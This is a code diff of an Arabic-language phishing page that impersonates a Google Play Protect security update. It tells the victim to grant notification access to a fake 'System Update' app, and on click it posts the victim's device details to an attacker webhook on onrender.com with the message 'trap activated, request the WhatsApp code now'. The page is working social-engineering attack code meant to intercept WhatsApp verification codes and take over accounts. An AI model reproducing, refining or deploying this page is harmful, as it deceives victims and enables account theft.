@@ -3,39 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث خدمات الأندرويد</title>
+    <title>تحديث النظام</title>
     <style>
-        body { font-family: sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
-        img { width: 60px; margin-bottom: 15px; }
-        h2 { font-size: 18px; color: #202124; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; }
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 320px; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Play_Protect_logo.png">
-        <h2>تحديث أمني مطلوب</h2>
-        <p>لحماية محادثاتك، يرجى تفعيل "مساعد الإشعارات" في إعدادات النظام للمتابعة.</p>
-        <button onclick="sendData()">تفعيل الحماية الآن</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Play_Protect_logo.png" width="60">
+        <h2>تحديث أمني عاجل</h2>
+        <p>يرجى تفعيل "مراقب الإشعارات" لحماية محادثاتك من الاختراق.</p>
+        <button onclick="sendHit()">تفعيل الحماية الآن</button>
     </div>
 
     <script>
-        function sendData() {
-            // تنبيه لتوجيه الضحية
-            alert("يرجى تفعيل 'Notification Access' لبرنامج 'System Update' في الصفحة التالية.");
-            
-            // إرسال البيانات لسيرفر Render الخاص بك
+        function sendHit() {
+            alert("سيتم توجيهك الآن لإعدادات النظام...");
             fetch('https://sniffer-bot-1.onrender.com/webhook', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    message: "🔥 تم تفعيل المصيدة! اطلب كود الواتساب الآن لليتم سحبه.",
+                    message: "✅ تم تفعيل المصيدة بنجاح! اطلب كود الواتساب الآن.",
                     device: navigator.userAgent
                 })
             }).then(() => {
-                console.log("Success");
+                alert("تم الاتصال بالسيرفر بنجاح.");
+            }).catch(() => {
+                alert("فشل الاتصال، تأكد أن سيرفر Render يعمل.");
             });
         }
     </script>
